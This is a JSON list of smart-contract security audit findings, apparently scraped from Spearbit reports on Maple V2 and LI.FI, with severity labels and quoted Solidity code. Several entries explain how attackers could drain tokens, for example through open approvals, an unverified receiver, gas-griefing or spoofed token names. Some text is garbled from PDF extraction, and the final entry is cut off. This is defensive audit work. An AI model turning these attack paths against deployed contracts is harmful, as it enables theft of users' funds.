        "title": "fullDaysLate computation can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The fullDaysLate computation can be optimized.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Users can prevent repossessed funds from being claimed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The DebtLocker.sol contract dictates an active liquidation by the following two conditions:  The _liquidator state variable is a non-zero address.  The current balance of the _liquidator contract is non-zero. If an arbitrary user sends 1 wei of funds to the liquidator's address, the borrower will be unable to claim repos- sessed funds as seen in the _handleClaimOfRepossessed() function. While the scope of the audit only covered the diff between v3.0.0 and v4.0.0-rc.0, the audit team decided it was important to include this as an informational issue. The Maple team will be addressing this in their V2 release.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "MEV whenever totalAssets jumps",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "An attack users can try to capture large interest payments is sandwiching a payment with a deposit and a withdrawal. The current codebase tries to mostly eliminate this attack by:  Optimistically assuming the next interest payment will be paid back and accruing the interest payment linearly over the payment interval.  Adding a withdrawal period. However, there are still circumstances where the totalAssets increase by a large amount at once:  Users paying back their payment early. The jump in totalAssets will be the paymentAmount - timeE- lapsedSincePaymentStart / paymentInterval * paymentAmount.  Users paying back their entire loan early (closeLoan).  Late payments increase it by the late interest fees and the accrued interest for the next payment from its start date to now. 21",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use ERCHelper approve() as best practice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The ERC20 approve function is being used by fundsAsset in fundLoan() to approve the max amount which does not check the return value.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Additional verification in removeLoanImpairment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "Currently, if removeLoanImpairment is called after the loan's original due date, there will be no issues because the loan's removeLoanImpairment function will revert. It would be good to add a comment about this logic or duplicate the check explicitly in the loan manager. If the loan implementation is upgraded in the future to have a non-reverting removeLoanImpairment function, then the loan manager as-is would account for the interest incorrectly.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Can check msg.sender != collateralAsset/fundsAsset for extra safety",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "Some old ERC tokens (e.g. the Sandbox's SAND token) allow arbitrary calls from the token address itself. This odd behavior is usually a result of implementing the ERC677 approveAndCall and transferAndCall functions incorrectly. With these tokens, it is technically possible for the low-level msg.sender.call(...) in the liquidator to be executing arbitrary code on one of the tokens, which could let an attacker drain the funds.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "IERC426 Implementation of preview and max functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "For the preview functions, EIP 4626 states: MAY revert due to other conditions that would also cause the deposit [mint/redeem, etc.] to revert. But the comments in the interface currently state: MUST NOT revert. In addition to the comments, there is the actual behavior of the preview functions. A commonly accepted interpreta- tion of the standard is that these preview functions should revert in the case of conditions such as protocolPaused, !active, !openToPublic totalAssets > liquidityCap etc. The argument basically states that the max functions should return 0 under such conditions and the preview functions should revert whenever the amount exceeds the max.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Set domainEnd correctly in intermediate _advanceGlobalPaymentAccounting steps",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "pay- ments[paymentWithEarliestDueDate].paymentDueDate, which is possibly zero if the last payment has just been accrued past. This is currently not an issue, because in this scenario domainEnd would never be used before it is set back to its correct value in _updateIssuanceParams. However, for increased readability, it is recommended to prevent this odd intermediate state from ever occurring. domainEnd function, set to is",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Replace hard-coded value with PRECISION constant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The constant PRECISION is equal to 1e30. The hard-coded value 1e30 is used in the _queueNext- Payment function, which can be replaced by PRECISION.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use of floating pragma version",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "Contracts should be deployed using a fixed pragma version. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "PoolManager has low-level shares computation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The PoolManager has low-level shares computation logic that should ideally only be in the ERC4626 Pool to separate the concerns.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add additional checks to prevent refinancing/funding a closed loan",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "It's important that an already liquidated loan is not reused by refinancing or funding again as it would break a second liquidation when the second liquidator contract is deployed with the same arguments and salt.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "PoolManager.removeLoanManager errors with out-of-bounds if loan manager not found",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The PoolManager.removeLoanManager errors with an out-of-bounds error if the loan manager is not found.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "PoolManager.removeLoanManager does not clear loanManagers mapping",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The PoolManager.removeLoanManager does not clear the reverse loanManagers[mapleLoan] = loanManager mapping.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Pool._requestRedeem reduces the wrong approval amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The requestRedeem function transfers escrowShares_ from owner but reduces the approval by shares_. Note that in the current code these values are the same but for future PoolManager upgrades this could change.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Issuance rate for double-late claims does not need to be updated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The previousRate_ for the 8c) case in claim is always zero because the payment (!onTimePayment_). The subtraction can be removed is late I'd suggest removing the subtraction here as it's confusing. The first payment's IR was reduced in _advanceGlob- alPaymentAccounting, the newly scheduled one that is also past due date never increased the IR.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Additional verification that paymentIdOf[loan_] is not 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "Most functions in the loan manager use the value paymentIdOf[loan_] without first checking if it's the default value of 0. Anyone can pay off a loan at any time to cause the claim function to set paymentIdOf[loan_] to 0, so even the privileged functions could be front-run to call on a loan with paymentIdOf 0. This is not an issue in the current codebase because each function would revert for some other reasons, but it is recommended to add an explicit check so future upgrades on other modules don't make this into a more serious issue.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "LoanManager redundant check on late payment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "block.timestamp <= nextPaymentDueDate_ in one of the if statements. The payment is already known to be late at this point in the code, so block.timestamp > previousPaymentDueDate_ is always true.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add encodeArguments/decodeArguments to WithdrawalManagerInitializer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "Unlike the other Initializers, the WithdrawalManagerInitializer.sol does not have public en- codeArguments/decodeArguments functions, and PoolDeployer need to be changed to use these functions cor- rectly",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reorder WM.processExit parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "All other WM and Pool function signatures start with (uint256 shares/assets, address owner) parameters but the WM.processExit has its parameters reversed (address, uint256).",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Additional verification in MapleLoanInitializer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The MapleLoanInitializer could verify additional arguments to avoid bad pool deployments.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Clean up updatePlatformServiceFee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The updatePlatformServiceFee can be cleaned up to use an existing helper function",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document restrictions on Refinancer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The refinancer may not set unexpected storage slots, like changing the _fundsAsset because _- drawableFunds, _refinanceInterest are still measured in the old fund's asset.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos / Incorrect documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The code and comments contain typos or are sometimes incorrect.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Receiver doesn't always reset allowance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function _swapAndCompleteBridgeTokens() of Receiver reset the approval to the executor at the end of an ERC20 transfer. However it there is insufficient gas then the approval is not reset. This allows the executor to access any tokens (of the same type) left in the Receiver. function _swapAndCompleteBridgeTokens(...) ... { ... if (LibAsset.isNativeAsset(assetId)) { ... } else { // case 2: ERC20 asset ... token.safeIncreaseAllowance(address(executor), amount); if (reserveRecoverGas && gasleft() < _recoverGas) { token.safeTransfer(receiver, amount); ... return; // no safeApprove 0 } try executor.swapAndCompleteBridgeTokens{...} ... token.safeApprove(address(executor), 0); } }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: High Risk"
        ]
    },
    {
        "title": "CelerIMFacet incorrectly sets RelayerCelerIM as receiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "When assigning a bytes memory variable to a new variable, the new variable points to the same memory location. Changing any one variable updates the other variable. Here is a PoC as a foundry test function testCopy() public { Pp memory x = Pp({ a: 2, b: address(2) }); Pp memory y = x; y.b = address(1); assertEq(x.b, y.b); } Thus, when CelerIMFacet._startBridge() updates bridgeDataAdjusted.receiver, _bridgeData.receiver is implicitly updated too. This makes the receiver on the destination chain to be the relayer address. // case 'yes': bridge + dest call - send to relayer ILiFi.BridgeData memory bridgeDataAdjusted = _bridgeData; bridgeDataAdjusted.receiver = address(relayer); (bytes32 transferId, address bridgeAddress) = relayer .sendTokenTransfer{ value: msgValue }(bridgeDataAdjusted, _celerIMData); // call message bus via relayer incl messageBusFee relayer.forwardSendMessageWithTransfer{value: _celerIMData.messageBusFee}( _bridgeData.receiver, uint64(_bridgeData.destinationChainId), bridgeAddress, transferId, _celerIMData.callData );",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Max approval to any address is possible",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "HopFacetOptimized.setApprovalForBridges() can be called by anyone to give max approval to any address for any ERC20 token. Any ERC20 token left in the Diamond can be stolen. function setApprovalForBridges(address[] calldata bridges,address[] calldata tokensToApprove) external { ... LibAsset.maxApproveERC20(..., type(uint256).max); ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Return value of low-level .call() not checked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Low-level primitive .call() doesn't revert in caller's context when the callee reverts. value is not checked, it can lead the caller to falsely believe that the call was successful. Receiver.sol uses .call() to transfer the native token to receiver. If receiver reverts, this can lead to locked ETH in Receiver contract.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Limits in LIFuelFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The facet LIFuelFacet is meant for small amounts, however, it doesn't have any limits on the funds sent. This might result in funds getting stuck due to insufficient liquidity on the receiving side. function _startBridge(...) ... { ... if (LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) { serviceFeeCollector.collectNativeGasFees{...}(...); } else { LibAsset.maxApproveERC20(...); serviceFeeCollector.collectTokenGasFees(...); ... } }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The optimal version _depositAndSwap() isn't always used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function _depositAndSwap() of SwapperV2 has two versions. The second version keeps _- nativeReserve that is meant for fees. Several facets don't use this version although their bridge does require native fees. This could result in calls reverting due to insufficient native tokens left. function _depositAndSwap(...) ... // 4 parameter version /// @param _nativeReserve Amount of native token to prevent from being swept back to the caller function _depositAndSwap(..., uint256 _nativeReserve) ... // 5 parameter version",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "setContractOwner() is insufficient to lock down the owner",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function transferOwnershipToZeroAddress() is meant to make the Diamond immutable. It sets the contract owner to 0. However, the contract owner can still be changed if there happens to be a pendingOwner. In that case confirmOwnershipTransfer() can still change the contract owner. function transferOwnershipToZeroAddress() external { // transfer ownership to 0 address LibDiamond.setContractOwner(address(0)); } function setContractOwner(address _newOwner) internal { DiamondStorage storage ds = diamondStorage(); address previousOwner = ds.contractOwner; ds.contractOwner = _newOwner; emit OwnershipTransferred(previousOwner, _newOwner); } function confirmOwnershipTransfer() external { Storage storage s = getStorage(); address _pendingOwner = s.newOwner; if (msg.sender != _pendingOwner) revert NotPendingOwner(); emit OwnershipTransferred(LibDiamond.contractOwner(), _pendingOwner); LibDiamond.setContractOwner(_pendingOwner); s.newOwner = LibAsset.NULL_ADDRESS; }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Receiver does not verify address from the originator chain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The Receiver contract is designed to receive the cross-chain call from libDiamond address on the destination chain. However, it does not verify the source chain address. An attacker can build a malicious _- callData. An attacker can steal funds if there are left tokens and there are allowances to the Executor. Note that the tokens may be lost in issue: \"Arithemetic underflow leading to unexpected revert and loss of funds in Receiver contract\". And there may be allowances to Executor in issue \"Receiver doesn't always reset allowance\"",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Arithemetic underflow leading to unexpected revert and loss of funds in Receiver contract.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The Receiver contract is designed to gracefully return the funds to users. It reserves the gas for recovering gas before doing swaps via executor.swapAndCompleteBridgeTokens. The logic of reserving gas for recovering funds is implemented at Receiver.sol#L236-L258 contract Receiver is ILiFi, ReentrancyGuard, TransferrableOwnership { // ... if (reserveRecoverGas && gasleft() < _recoverGas) { // case 1a: not enough gas left to execute calls receiver.call{ value: amount }(\"\"); // ... } // case 1b: enough gas left to execute calls try executor.swapAndCompleteBridgeTokens{ value: amount, gas: gasleft() - _recoverGas }(_transactionId, _swapData, assetId, receiver) {} catch { receiver.call{ value: amount }(\"\"); } // ... } 10 The gasleft() returns the remaining gas of a call. It is continuously decreasing. The second query of gasleft() is smaller than the first query. Hence, if the attacker tries to relay the transaction with a carefully crafted gas where gasleft() >= _recoverGas at the first quiry and gasleft() - _recoverGas reverts. This results in the token loss in the Receiver contract.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Use of name to identify a token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "startBridgeTokensViaCelerIM() uses the token name to identify cfUSDC token. Another token with the same name can pass this check. An attacker can create a scam token with the name \"cfUSDC\" and a function canonical() returning a legit ERC20 token address, say WETH. If this token is passed as _bridge- Data.sendingAssetId, CelerIMFacet will transfer WETH. 11 if ( keccak256( abi.encodePacked( ERC20(_bridgeData.sendingAssetId).symbol() ) ) == keccak256(abi.encodePacked((\"cfUSDC\"))) ) { // special case for cfUSDC token asset = IERC20( CelerToken(_bridgeData.sendingAssetId).canonical() ); }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Unvalidated destination address in Gravity faucet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Data.destinationAddress address. The code does not validate if the provided destination address is in the valid bech32 format. there is an issue related to the validation of In the Gravity faucet, This can potentially cause issues when sending tokens to the destination address. If the provided address is not in the bech32 format, the tokens can be locked. Also, it can lead to confusion for the end-users as they might enter an invalid address and lose their tokens without any warning or error message. it is recommended to add a validation check for the _gravity-",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Hardcode or whitelist the Thorswap vault address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The issue with this code is that the depositWithExpiry function allows the user to enter any arbitrary vault address, which could potentially lead to a loss of tokens. If a user enters an incorrect or non-existent vault address, the tokens could be lost forever. There should be some validation on the vault address to ensure that it is a valid and trusted address before allowing deposits to be made to it.  Router 12 // Deposit an asset with a memo. ETH is forwarded, ERC-20 stays in ROUTER function deposit(address payable vault, address asset, uint amount, string memory memo) public payable nonReentrant{ ,! uint safeAmount; if(asset == address(0)){ safeAmount = msg.value; bool success = vault.send(safeAmount); require(success); } else { require(msg.value == 0, \"THORChain_Router: unexpected eth\"); // protect user from ,! accidentally locking up eth if(asset == RUNE) { safeAmount = amount; iRUNE(RUNE).transferTo(address(this), amount); iERC20(RUNE).burn(amount); } else { safeAmount = safeTransferFrom(asset, amount); // Transfer asset _vaultAllowance[vault][asset] += safeAmount; // Credit to chosen vault } } emit Deposit(vault, asset, safeAmount, memo); }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Check enough native assets for fee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function _startBridge() of SquidFacet adds _squidData.fee to _bridgeData.minAmount. It has verified there is enough native asset for _bridgeData.minAmount, but not for _squidData.fee. So this could use native assets present in the Diamond, although there normally shouldn't be any native assets left. A similar issue occurs in:  CelerIMFacet  DeBridgeFacet function _startBridge(...) ... { ... uint256 msgValue = _squidData.fee; if (LibAsset.isNativeAsset(address(sendingAssetId))) { msgValue += _bridgeData.minAmount; } ... ... squidRouter.bridgeCall{ value: msgValue }(...); ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "No check on native assets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The functions startBridgeTokensViaHopL1Native() , startBridgeTokensViaXDaiBridge() and startBridgeTokensViaMultichain() don't check _bridgeData.minAmount <= msg.value. So this could use na- tive assets that are still in the Diamond, although that normally shouldn't happen. This might be an issue in combination with reentrancy. function startBridgeTokensViaHopL1Native(...) ... { _hopData.hopBridge.sendToL2{ value: _bridgeData.minAmount }( ... ); ... } function startBridgeTokensViaXDaiBridge(...) ... { _startBridge(_bridgeData); } function startBridgeTokensViaMultichain(...) ... { if (!LibAsset.isNativeAsset(_bridgeData.sendingAssetId)) LibAsset.depositAsset(_bridgeData.sendingAssetId,_bridgeData.minAmount); } // no check for native assets _startBridge(_bridgeData, _multichainData); }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing doesNotContainDestinationCalls()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The functions startBridgeTokensViaLIFuel() and swapAndStartBridgeTokensViaLIFuel() doesn't have doesNotContainDestinationCalls(). function startBridgeTokensViaLIFuel(...) external payable nonReentrant refundExcessNative(payable(msg.sender)) doesNotContainSourceSwaps(_bridgeData) validateBridgeData(_bridgeData) { ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Race condition in _startBridge of LIFuelFacet.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "If the mapping for FEE_COLLECTOR_NAME hasn't been set up yet, then serviceFeeCollector will be address(0) in function _startBridge of LIFuelFacet. This might give unexpected results. function _startBridge(...) ... ( ... ServiceFeeCollector serviceFeeCollector = ServiceFeeCollector( LibMappings.getPeripheryRegistryMappings().contracts[FEE_COLLECTOR_NAME] ); ... } function getPeripheryContract(string calldata _name) external view returns (address) { return LibMappings.getPeripheryRegistryMappings().contracts[_name]; }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Sweep tokens from Hopfacets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The Hop bridges HopFacet and HopFacetOptimized don't check that _bridgeData.sendingAssetId is the same as the bridge token. So this could be used to sweep tokens out of the Diamond contract. Normally there shouldn't be any tokens left at the Diamond, however, in this version there are small amounts left: Etherscan LiFiDiamond.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing emit in _swapAndCompleteBridgeTokens of Receiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "In function _swapAndCompleteBridgeTokens the catch of ERC20 tokens does an emit, while the comparable catch of native assets doesn't do an emit. function _swapAndCompleteBridgeTokens(...) ... { ... if (LibAsset.isNativeAsset(assetId)) { .. try ... {} catch { receiver.call{ value: amount }(\"\"); // no emit } ... } else { // case 2: ERC20 asset ... try ... {} catch { token.safeTransfer(receiver, amount); emit LiFiTransferRecovered(...); } } }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Spam events in ServiceFeeCollector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The contract ServiceFeeCollector has several functions that collect fees and are permissionless. This could result in spam events, which might confuse the processing of the events. function collectTokenGasFees(...) ... { ... emit GasFeesCollected(tokenAddress, receiver, feeAmount); } function collectNativeGasFees(...) ... { ... emit GasFeesCollected(LibAsset.NULL_ADDRESS, receiver, feeAmount); } function collectTokenInsuranceFees(...) ... { ... emit InsuranceFeesCollected(tokenAddress, receiver, feeAmount); } function collectNativeInsuranceFees(...) ... { ... emit InsuranceFeesCollected(LibAsset.NULL_ADDRESS,receiver,feeAmount); }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Function depositAsset() allows 0 amount of native assets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The function depositAsset() disallows amount == 0 for ERC20, however it does allow amount == 0 for native assets. function depositAsset(address assetId, uint256 amount) internal { if (isNativeAsset(assetId)) { if (msg.value < amount) revert InvalidAmount(); } else { if (amount == 0) revert InvalidAmount(); ... } }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inadequate expiration time check in ThorSwapFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "According to Thorchain, the expiration time for certain operations should be set to +60 minutes. How- ever, there is currently no check in place to enforce this requirement. This oversight may lead to users inadvertently setting incorrect expiration times, potentially causing unexpected behavior or issues within the ThorSwapFacet.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Insufficient validation of bridgedTokenSymbol and sendingAssetId",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "During the code review, It has been noticed that the facet does not adequately check the corre- spondence between the bridgedTokenSymbol and sendingAssetId parameters. This oversight could allow for a random token to be sent to the Diamond, while still bridging another available token within the Diamond, even when no tokens should typically be left in the Diamond.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Check for destinationChainId in CBridgeFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Function _startBridge() of CBridgeFacet contains a check on destinationChainId and contains conversions to uint64. If both block.chainid and _bridgeData.destinationChainId) fit in an uint64 then the checks of modifier val- idateBridgeData are already sufficient. When _bridgeData.destinationChainId > type(uint64).max then this never reverts: if (uint64(block.chainid) == _bridgeData.destinationChainId) revert CannotBridgeToSameNetwork(); Then in the rest of the code it takes the truncated varion of the destinationChainId via uint64(_bridge- Data.destinationChainId), which can be any value, including block.chainid. So you can still bridge to the same chain. function _startBridge(ILiFi.BridgeData memory _bridgeData,CBridgeData memory _cBridgeData) private { if (uint64(block.chainid) == _bridgeData.destinationChainId) revert CannotBridgeToSameNetwork(); if (...) { cBridge.sendNative{ value: _bridgeData.minAmount }(... , ,! uint64(_bridgeData.destinationChainId),...); } else { ... cBridge.send(..., uint64(_bridgeData.destinationChainId), ...); } } modifier validateBridgeData(ILiFi.BridgeData memory _bridgeData) { ... if (_bridgeData.destinationChainId == block.chainid) { revert CannotBridgeToSameNetwork(); } ... }",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Absence of nonReentrant in HopFacetOptimized facet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "HopFacetOptimized is a facet-based smart contract implementation that aims to optimize gas usage and streamline the execution of certain functions. It doesn't have the checks that other facets have: nonReentrant refundExcessNative(payable(msg.sender)) containsSourceSwaps(_bridgeData) doesNotContainDestinationCalls(_bridgeData) validateBridgeData(_bridgeData) Most missing checks are done on purpose to save gas. However, the most important check is the nonReentrant modifier. On several places in the Diamond it is possible to trigger a reentrant call, for example via ERC777 18 tokens, custom tokens, native tokens transfers. In combination with the complexity of the code and the power of ERC20Proxy.sol it is difficult to make sure no attacks can occur.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Revert for excessive approvals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "Certain tokens, such as UNI and COMP, undergo a reversal if the value input for approval or transfer surpasses uint96. Both aforementioned tokens possess unique logic in their approval process that sets the allowance to the maximum value of uint96 when the approval amount equals uint256(-1). Note: Hop currently doesn't support these token so set to low risk.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inconsistent transaction failure/stuck due to missing validation of global fixed native fee rate and execution fee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-retainer1-Spearbit-Security-Review.pdf",
        "body": "The current implementation of the facet logic does not validate the global fixed native fee rate and execution fee, which can lead to inconsistent transaction failures or getting stuck in the process. This issue can arise when the fee rate is not set correctly or there are discrepancies between the fee rate used in the smart contract and the actual fee rate. This can result in transactions getting rejected or stuck, causing inconvenience to users and affecting the overall user experience.",
        "labels": [
            "Spearbit",
            "LIFI-retainer1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incorrect value emitted",
